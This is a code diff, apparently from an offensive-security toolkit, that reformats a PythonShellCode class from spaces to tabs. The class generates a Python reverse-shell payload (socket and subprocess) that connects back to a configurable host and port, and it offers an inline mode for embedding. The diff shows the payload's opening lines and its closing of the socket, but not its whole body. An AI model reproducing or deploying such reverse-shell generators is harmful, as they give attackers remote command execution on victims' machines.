@@ -2,23 +2,23 @@ from .base import ShellCode
 
 
 class PythonShellCode(ShellCode):
-    """
-        Class with shellcodes for python language
-    """
-
-    def __init__(self, connect_back_ip='localhost', connect_back_port=5555):
-        ShellCode.__init__(self, connect_back_ip=connect_back_ip, connect_back_port=connect_back_port)
-
-    def get_python_code(self, bad_chars):
-        """
-            Function to get python shellcode
-        """
-
-        if not self.connect_back_ip or not self.connect_back_port:
-            print("Settings for connect back listener must be defined")
-            return False
-
-        python_code = """
+	"""
+		 Class with shellcodes for python language
+	"""
+	
+	def __init__(self, connect_back_ip = 'localhost', connect_back_port = 5555):
+		ShellCode.__init__(self, connect_back_ip = connect_back_ip, connect_back_port = connect_back_port)
+	
+	def get_python_code(self, bad_chars):
+		"""
+			 Function to get python shellcode
+		"""
+		
+		if not self.connect_back_ip or not self.connect_back_port:
+			print("Settings for connect back listener must be defined")
+			return False
+		
+		python_code = """
         #!/usr/bin/python
         import socket,subprocess
         HOST = '{{LOCALHOST}}'    # The remote host
@@ -45,12 +45,12 @@ class PythonShellCode(ShellCode):
         # close socket
         s.close()
         """
-
-        python_code = self.format_shellcode(python_code)
-        return python_code
-
-    def get_shellcode(self, inline=False):
-        shell = self.get_python_code(self.bad_chars)
-        if inline:
-            shell = self.make_inline(shell)
-        return shell
+		
+		python_code = self.format_shellcode(python_code)
+		return python_code
+	
+	def get_shellcode(self, inline = False):
+		shell = self.get_python_code(self.bad_chars)
+		if inline:
+			shell = self.make_inline(shell)
+		return shell
